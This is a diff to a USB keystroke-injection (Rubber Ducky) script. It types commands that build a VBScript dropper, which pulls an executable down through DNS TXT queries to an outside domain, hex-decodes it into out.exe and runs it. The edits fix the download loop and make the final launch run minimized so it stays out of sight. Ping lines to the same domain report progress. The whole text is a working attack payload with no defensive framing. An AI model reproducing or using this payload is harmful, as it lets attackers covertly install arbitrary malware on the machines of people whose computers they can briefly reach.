@@ -1,20 +1,19 @@
 GUI r
-GUI r
 DELAY 300
-STRING cmd /C "(echo On Error Resume Next& echo Set objShell = CreateObject^("WScript.Shell"^)& echo Set writer = CreateObject^("Scripting.FileSystemObject"^).createtextfile^("out.exe"^))>1.vbs& ping x1.yourzone.tk"
+STRING cmd /C "(echo On Error Resume Next&echo Set objShell = CreateObject^("WScript.Shell"^)&echo Set writer = CreateObject^("Scripting.FileSystemObject"^).createtextfile^("out.exe"^)&echo d = 1&echo While mid^(txt,1,1^) ^<^> """")>1.vbs& ping x1.yourzone.tk"
 ENTER
 
 GUI r
 DELAY 300
-STRING cmd /C "(echo For d = 1 To 927& echo pos = 0& echo While pos = 0& echo Set exec = objShell.Exec^("nslookup -type=txt d"^&d^&".txt.yourzone.tk"^)& echo res = exec.Stdout.ReadAll^(^))>>1.vbs& ping x2.yourzone.tk"
+STRING cmd /C "(echo pos = 0&echo While pos = 0&echo Set exec = objShell.Exec^("nslookup -type=txt d"^&d^&".txt.yourzone.tk"^)&echo res = exec.Stdout.ReadAll^(^)&echo pos = inStr^(1,res,"?"^)&echo pos2 = inStr^(pos+1,res,""""^))>>1.vbs& ping x2.yourzone.tk"
 ENTER
 
 GUI r
 DELAY 300
-STRING cmd /C "(echo pos = inStr^(1,res,"?"^)& echo txt = Mid^(res,pos+1,253^)& echo Wend& echo For b = 0 To Len^(txt^)/2-1& echo writer.Write Chr^(CInt^("^&H" ^& Mid^(txt,1+b*2,2^)^)^)& echo Next& echo Next)>>1.vbs& ping x3.yourzone.tk"
+STRING cmd /C "(echo txt = Mid^(res,pos+1,pos2-pos^)&echo Wend&echo For b = 0 To Len^(txt^)/2-1&echo writer.Write Chr^(CInt^("&H" ^& Mid^(txt,1+b*2,2^)^)^)&echo Next&echo d = d + 1&echo Wend)>>1.vbs& ping x3.yourzone.tk"
 ENTER
 
 GUI r
 DELAY 300
-STRING cmd /C "wscript 1.vbs & out.exe"
+STRING cmd /C start /min cmd /C "cscript 1.vbs & out.exe"
 ENTER
